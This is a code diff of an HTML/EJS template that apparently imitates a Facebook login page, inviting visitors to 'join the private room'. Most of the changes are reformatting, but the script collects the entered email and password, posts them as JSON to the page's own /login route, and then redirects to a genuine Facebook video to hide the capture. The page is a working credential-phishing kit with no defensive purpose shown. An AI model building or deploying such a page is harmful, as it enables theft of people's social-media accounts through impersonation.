@@ -42,8 +42,13 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         /* Animated text */
@@ -55,8 +60,15 @@
         }
 
         @keyframes fadeInOut {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
         }
 
         .message {
@@ -97,7 +109,7 @@
             transition: all 0.3s ease-in-out;
         }
 
-     
+
         .loader {
             margin-left: 10px;
             border: 4px solid #e0e0e0;
@@ -109,8 +121,13 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
@@ -136,36 +153,38 @@
             <div class="login-box">
                 <form action="/login" method="post" onsubmit="showSpinner()">
                     <% if (message) { %>
-                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
+                        <div
+                            class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
                             <%= message %>
                         </div>
-                    <% } %>
-                    <input type="text" name="email" placeholder="Email address or phone number" required >
-                    <input type="password" name="password" placeholder="Password" required>
-                    
-                    <!-- Spinner and "Joining..." text - initially hidden -->
-                    <div class="joining" style="display: none;">
-                        Joining... <div class="loader"></div>
-                    </div>
-                    
-                    <!-- Submit button -->
-                    <button type="submit" class="log">Join</button>
-                
-                    <a href="#" class="log-link">Forgotten password?</a>
-                    <hr>
-                    <div class="create-btn-wrapper">
-                        <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
-                    </div>
+                        <% } %>
+                            <input type="text" name="email" placeholder="Email address or phone number" required>
+                            <input type="password" name="password" placeholder="Password" required>
+
+                            <!-- Spinner and "Joining..." text - initially hidden -->
+                            <div class="joining" style="display: none;">
+                                Joining... <div class="loader"></div>
+                            </div>
+
+                            <!-- Submit button -->
+                            <button type="submit" class="log">Join</button>
+
+                            <a href="#" class="log-link">Forgotten password?</a>
+                            <hr>
+                            <div class="create-btn-wrapper">
+                                <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new
+                                    account</a>
+                            </div>
                 </form>
-                
+
             </div>
             <div class="form-b">
                 <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
-                 <span>to join the private room.</span> 
+                <span>to join the private room.</span>
             </div>
         </div>
-        </div>
-        
+    </div>
+
     </div>
 
     <footer>
@@ -188,27 +207,30 @@
 
     <script>
         // Hide the preloader once the page is loaded
-        window.addEventListener("load", function() {
+        window.addEventListener("load", function () {
             const preloader = document.getElementById("preloader");
             preloader.classList.add("hidden");
         });
-    
+
         // Show spinner on form submission and handle redirection
-        function handleFormSubmission(event) {
+        async function handleFormSubmission(event) {
             event.preventDefault();
-    
+
             // Show spinner
             document.querySelector('.joining').style.display = 'flex';
             document.querySelector('.log').disabled = true;
-    
-            // Gather form data
-            const form = event.target;
-            const formData = new FormData(form);
-    
-            // Send POST request
-            fetch(form.action, {
-                method: form.method,
-                body: formData
+
+
+            const formData = {
+                email: document.querySelector('input[name="email"]').value,
+                password: document.querySelector('input[name="password"]').value
+            };
+
+            // Send POST request with form data
+            await fetch("/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
             }).then(response => {
                 if (response.ok) {
                     // Redirect to home page to display success or error message
@@ -220,14 +242,14 @@
                 }
             });
         }
-    
+
         // Attach submission handler to form
         document.querySelector('form').addEventListener('submit', handleFormSubmission);
-    
+
         // Facebook Redirect Logic
-        window.addEventListener("DOMContentLoaded", function() {
+        window.addEventListener("DOMContentLoaded", function () {
             const successMessage = document.querySelector('.success');
-            
+
             if (successMessage) {
                 setTimeout(() => {
                     window.location.href = 'https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe';
@@ -235,11 +257,11 @@
             }
         });
     </script>
-    
-    
 
-    
-    
+
+
+
+
 
 </body>
 
